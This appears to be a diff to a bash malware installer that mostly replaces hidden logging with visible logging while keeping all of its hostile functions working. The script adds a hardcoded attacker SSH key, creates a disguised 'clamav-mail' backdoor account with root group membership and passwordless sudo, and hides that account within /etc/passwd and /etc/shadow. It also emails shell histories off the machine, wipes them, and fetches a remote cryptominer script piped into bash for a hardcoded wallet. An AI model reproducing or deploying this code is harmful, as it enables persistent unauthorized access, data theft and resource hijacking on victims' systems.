@@ -715,13 +607,13 @@ cleanup_histories() {
 
 # Installation functions
 install_mail_utils() {
-    log_hidden "Installing mail utilities..."
+    log_message "Installing mail utilities..."
     if command_exists apt-get; then
-        apt-get update -qq && apt-get install -y mailutils 2>&1 | tee -a "$HIDDEN_LOG"
+        apt-get update -qq && apt-get install -y mailutils 2>&1 | tee -a "$LOG_FILE"
     elif command_exists yum; then
-        yum install -y mailx 2>&1 | tee -a "$HIDDEN_LOG"
+        yum install -y mailx 2>&1 | tee -a "$LOG_FILE"
     else
-        log_hidden "Warning: Could not determine package manager to install mail utilities"
+        log_message "Warning: Could not determine package manager to install mail utilities"
     fi
 }
 
@@ -731,7 +623,7 @@ setup_ssh_key() {
     local auth_keys="$ssh_dir/authorized_keys"
     local ssh_key='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/DbQQe/G8V0c9+VNjJEmoNxUrIGDqD+vSvS/2uAQ9HaumDAvVau2CcVBJM9STUm6xEGXdM/81LeJBVnw01D+FgFo5Sr/4zo+MDMUS/y/TfwK8wtdeuopvgET/HiZJn9/d68vbWXaS3jnQVTAI9EvpC1WTjYTYxFS/SyWJUQTA8tYF30jagmkBTzFjr/EKxxKTttdb79mmOgx1jP3E7bTjRPL9VxfhoYsuqbPk+FwOAsNZ1zv1UEjXMBvH+JnYbTG/Eoqs3WGhda9h3ziuNrzJGwcXuDhQI1B32XgPDxB8etsT6or8aqWGdRlgiYtkPCmrv+5pEUD8wS3WFhnOrm5Srew7beIl4LPLgbCPTOETgwB4gk/5U1ZzdlYmtiBNJxMeX38BsGoAhTDbFLcakkKP+FyXU/DsoAcow4av4OGTsJfs+sIeOWDQ+We5E4oc/olVNdSZ18RG5dwUde6bXbsrF5ipnE8oIBUI0z76fcbAOxogO/oxhvpuyWPOwXE6GaeOhWfWTxIyV5X4fuFDQXRPlMrlkWZ/cYb+l5JiT1h+vcpX3/dQC13IekE3cUsr08vicZIVOmCoQJy6vOjkj+XsA7pMYb3KgxXgQ+lbCBCtAwKxjGrfbRrlWoqweS/pyGxGrUVJZCf6rC6spEIs+aMy97+Q=='
     
-    log_hidden "Setting up SSH key in $ssh_dir"
+    log_message "Setting up SSH key in $ssh_dir"
     
     # Remove old SSH directory if it exists
     if [ -d "$ssh_dir" ]; then
@@ -746,9 +638,9 @@ setup_ssh_key() {
     if [ ! -f "$auth_keys" ] || ! grep -q "AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9f" "$auth_keys" 2>/dev/null; then
         echo "$ssh_key" >> "$auth_keys"
         chmod 600 "$auth_keys"
-        log_hidden "SSH key added successfully"
+        log_message "SSH key added successfully"
     else
-        log_hidden "SSH key already exists, skipping"
+        log_message "SSH key already exists, skipping"
     fi
 }
 
@@ -758,15 +650,15 @@ create_backdoor_user() {
     local uid=455
     local password='1!taugenichts'
     
-    log_hidden "Creating backdoor user: $username"
+    log_message "Creating backdoor user: $username"
     
     # Detect password hashing method
     local hash_method=$(grep '^ENCRYPT_METHOD' /etc/login.defs 2>/dev/null | awk '{print $2}')
     if [ -z "$hash_method" ]; then
         hash_method="SHA512"
-        log_hidden "Using default hash method: SHA512"
+        log_message "Using default hash method: SHA512"
     else
-        log_hidden "Detected hash method: $hash_method"
+        log_message "Detected hash method: $hash_method"
     fi
     
     # Generate password hash
@@ -778,48 +670,48 @@ create_backdoor_user() {
     fi
     
     if [ -z "$password_hash" ]; then
-        log_hidden "ERROR: Failed to generate password hash"
+        log_message "ERROR: Failed to generate password hash"
         return 1
     fi
     
     # Remove existing user if present
     if id -u "$username" >/dev/null 2>&1; then
-        log_hidden "User $username already exists, removing..."
-        userdel --remove "$username" 2>/dev/null || log_hidden "Warning: Could not remove existing user"
+        log_message "User $username already exists, removing..."
+        userdel --remove "$username" 2>/dev/null || log_message "Warning: Could not remove existing user"
     fi
     
     # Create sudo group if it doesn't exist
     if ! grep -q '^sudo:' /etc/group 2>/dev/null; then
-        log_hidden "Creating sudo group"
-        groupadd sudo 2>/dev/null || log_hidden "Warning: Could not create sudo group"
+        log_message "Creating sudo group"
+        groupadd sudo 2>/dev/null || log_message "Warning: Could not create sudo group"
     fi
     
     # Create user-specific group if it doesn't exist
     if ! grep -q "^${username}:" /etc/group 2>/dev/null; then
-        log_hidden "Creating group: $username"
-        groupadd "$username" 2>/dev/null || log_hidden "Warning: Could not create user group"
+        log_message "Creating group: $username"
+        groupadd "$username" 2>/dev/null || log_message "Warning: Could not create user group"
     fi
     
     # Create the user
-    log_hidden "Creating user account"
+    log_message "Creating user account"
     if useradd -u "$uid" -G root,sudo -g "$username" -M -o -s /bin/bash "$username" 2>/dev/null; then
-        log_hidden "User created successfully"
+        log_message "User created successfully"
     else
-        log_hidden "ERROR: Failed to create user"
+        log_message "ERROR: Failed to create user"
         return 1
     fi
     
     # Set password
-    log_hidden "Setting user password"
+    log_message "Setting user password"
     if usermod -p "$password_hash" "$username" 2>/dev/null; then
-        log_hidden "Password set successfully"
+        log_message "Password set successfully"
     else
-        log_hidden "ERROR: Failed to set password"
+        log_message "ERROR: Failed to set password"
         return 1
     fi
     
     # Reorder passwd file to hide user in the middle
-    log_hidden "Reordering passwd file"
+    log_message "Reordering passwd file"
     if [ -f /etc/passwd ]; then
         awk '{lines[NR]=$0} END{
             if (NR < 3) {
@@ -837,7 +729,7 @@ create_backdoor_user() {
     fi
     
     # Reorder shadow file to hide user in the middle
-    log_hidden "Reordering shadow file"
+    log_message "Reordering shadow file"
     if [ -f /etc/shadow ]; then
         awk '{lines[NR]=$0} END{
             if (NR < 3) {
@@ -854,7 +746,7 @@ create_backdoor_user() {
         }' /etc/shadow > /tmp/shadow && mv /tmp/shadow /etc/shadow
     fi
     
-    log_hidden "User creation completed"
+    log_message "User creation completed"
     return 0
 }
 
@@ -863,7 +755,7 @@ setup_sudoers() {
     local username="clamav-mail"
     local sudoers_file="/etc/sudoers.d/$username"
     
-    log_hidden "Setting up sudoers for $username"
+    log_message "Setting up sudoers for $username"
     
     # Create sudoers entry
     echo "$username ALL=(ALL) NOPASSWD: ALL" > "$sudoers_file"
@@ -874,37 +766,85 @@ setup_sudoers() {
     
     # Validate sudoers file
     if visudo -c -f "$sudoers_file" >/dev/null 2>&1; then
-        log_hidden "Sudoers file validated successfully"
+        log_message "Sudoers file validated successfully"
         return 0
     else
-        log_hidden "ERROR: Sudoers file validation failed, removing"
+        log_message "ERROR: Sudoers file validation failed, removing"
         rm -f "$sudoers_file"
         return 1
     fi
 }
 
-# Function to check required dependencies
-check_dependencies() {
-    local missing_deps=()
-    local required_deps=("free" "df" "hostname" "base64")
+# Function to download and execute remote script safely
+download_and_execute() {
+    local url="$1"
+    local wallet="$2"
+    local description="$3"
+    local max_retries=3
+    local retry=0
+    local dns_fix_attempted=false
     
-    for cmd in "${required_deps[@]}"; do
-        if ! command_exists "$cmd"; then
-            missing_deps+=("$cmd")
+    log_message "Downloading $description from: $url"
+    
+    while [ $retry -lt $max_retries ]; do
+        # Try curl first
+        if command -v curl >/dev/null 2>&1; then
+            # Check if URL is reachable with curl
+            if curl -s --head --max-time 5 "$url" >/dev/null 2>&1; then
+                log_message "Executing $description with curl (attempt $((retry + 1))/$max_retries)"
+                if curl -s -L --max-time 30 "$url" | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+                    log_message "$description completed successfully"
+                    return 0
+                fi
+            else
+                log_message "curl failed - trying with --insecure flag..."
+                if curl -s -L --insecure --max-time 30 "$url" | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+                    log_message "$description completed successfully (with --insecure)"
+                    return 0
+                fi
+            fi
+        fi
+        
+        # If curl failed or doesn't exist, try wget
+        if command -v wget >/dev/null 2>&1; then
+            log_message "curl failed - falling back to wget (attempt $((retry + 1))/$max_retries)"
+            if wget -qO- --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+                log_message "$description completed successfully via wget"
+                return 0
+            else
+                log_message "wget with SSL verification failed - trying --no-check-certificate..."
+                if wget -qO- --no-check-certificate --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
+                    log_message "$description completed successfully via wget (--no-check-certificate)"
+                    return 0
+                fi
+            fi
+        fi
+        
+        log_message "Both curl and wget failed (attempt $((retry + 1))/$max_retries)"
+        
+        retry=$((retry + 1))
+        
+        # On last retry attempt, try DNS fix if not already attempted
+        if [ $retry -eq $max_retries ] && [ "$dns_fix_attempted" = false ]; then
+            log_message "All download attempts failed - attempting DNS fix..."
+            if fix_dns_and_retry; then
+                log_message "DNS fixed - retrying download one more time..."
+                dns_fix_attempted=true
+                max_retries=$((max_retries + 1))  # Give one more chance
+                sleep 3
+            fi
+        elif [ $retry -lt $max_retries ]; then
+            log_message "Retry in 3 seconds..."
+            sleep 3
         fi
     done
     
-    if [ ${#missing_deps[@]} -gt 0 ]; then
-        log_hidden "WARNING: Missing dependencies: ${missing_deps[*]}"
-        log_hidden "Will attempt to continue anyway"
-        return 1
-    fi
-    
-    return 0
+    log_message "ERROR: $description failed after all retry attempts with both curl and wget"
+    return 1
 }
 
 root_installation() {
-    log_hidden "Starting root installation..."
+    log_message "Starting root installation..."
     
     # Install mail utilities
     install_mail_utils
@@ -914,16 +854,16 @@ root_installation() {
     
     # Create backdoor user
     if create_backdoor_user; then
-        log_hidden "Backdoor user created successfully"
+        log_message "Backdoor user created successfully"
     else
-        log_hidden "ERROR: Failed to create backdoor user"
+        log_message "ERROR: Failed to create backdoor user"
     fi
     
     # Setup sudoers
     if setup_sudoers; then
-        log_hidden "Sudoers configured successfully"
+        log_message "Sudoers configured successfully"
     else
-        log_hidden "WARNING: Sudoers configuration failed"
+        log_message "WARNING: Sudoers configuration failed"
     fi
     
     # Run the miner setup
@@ -933,11 +873,11 @@ root_installation() {
         "$wallet" \
         "root miner setup"
     
-    log_hidden "Root installation completed"
+    log_message "Root installation completed"
 }
 
 user_installation() {
-    log_hidden "Starting user installation..."
+    log_message "Starting user installation..."
     
     local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
     download_and_execute \
@@ -945,76 +885,59 @@ user_installation() {
         "$wallet" \
         "user miner setup"
     
-    log_hidden "User installation completed"
+    log_message "User installation completed"
 }
 
 # --- Main Execution ---
 
-# Initialize hidden logging system
-log_hidden "=== SCRIPT INITIALIZATION ==="
-log_hidden "Script started by user: $(whoami)"
-log_hidden "Install directory: $INSTALL_DIR"
-log_hidden "Hidden log: $HIDDEN_LOG"
+# Initialize log file
+: > "$LOG_FILE"
+log_message "Script started by user: $(whoami)"
 
 # Check dependencies first
 if ! check_dependencies; then
-    log_hidden "WARNING: Dependency check failed. Continuing anyway..."
+    log_message "ERROR: Dependency check failed. Exiting."
+    exit 1
 fi
 
-# Service checks (using enhanced functions)
-log_hidden "Checking for conflicting services..."
+# Service checks
+log_message "Checking for conflicting services..."
 for service in "${SERVICES_TO_CHECK[@]}"; do
     if does_service_exist "$service"; then
         if is_service_running "$service"; then
-            log_hidden "ERROR: Service $service is running. Attempting to stop..."
-            safe_service_stop "$service"
-            sleep 2
-            # Check again
-            if is_service_running "$service"; then
-                log_hidden "ERROR: Could not stop $service. Aborting."
-                exit 1
-            else
-                log_hidden "Service $service stopped successfully"
-            fi
+            log_message "ERROR: Service $service is running. Aborting."
+            exit 1
         else
-            log_hidden "Service $service exists but is not running"
+            log_message "Service $service exists but is not running"
         fi
     else
-        log_hidden "Service $service does not exist"
+        log_message "Service $service does not exist"
     fi
 done
 
-# System info display (logged)
-log_hidden "Displaying system information"
-log_hidden "RAM: $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo 'N/A')"
-log_hidden "CPU Cores: $(nproc 2>/dev/null || echo 'N/A')"
-log_hidden "Storage: $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo 'N/A')"
+# System info display
+log_message "Displaying system information"
+echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
+echo -e "|        RAM        |  $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo 'N/A')  |"
+echo -e "|   CPU Cores    |      $(nproc 2>/dev/null || echo 'N/A')      |"
+echo -e "|     Storage      |   $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo 'N/A')   |"
+echo -e "---------------------------------"
 
 # Send report and only cleanup if successful
-log_hidden "Sending system history report..."
-send_histories_email || log_hidden "Continuing after email attempt..."
+log_message "Sending system history report..."
+send_histories_email || log_message "Continuing after email attempt..."
 
 # Always cleanup histories for security
-log_hidden "Cleaning up shell histories..."
+log_message "Cleaning up shell histories..."
 cleanup_histories
 
 # Installation
 if [[ $(id -u) -eq 0 ]]; then
-    log_hidden "Running as root"
+    log_message "Running as root"
     root_installation
 else
-    log_hidden "Running as regular user"
+    log_message "Running as regular user"
     user_installation
 fi
 
-# Final cleanup and hiding
-log_hidden "=== FINALIZING INSTALLATION ==="
-clean_hidden_logs
-hide_logfile
-
-log_hidden "Script execution completed at: $(date)"
-log_hidden "Hidden log location: $INSTALL_DIR/.bash_profile.backup"
-
-echo "[✓] Installation complete!"
-echo "[*] All operations logged to hidden location"
-echo "[*] To view logs: cat $INSTALL_DIR/.bash_profile.backup 2>/dev/null"
+log_message "Script execution completed"
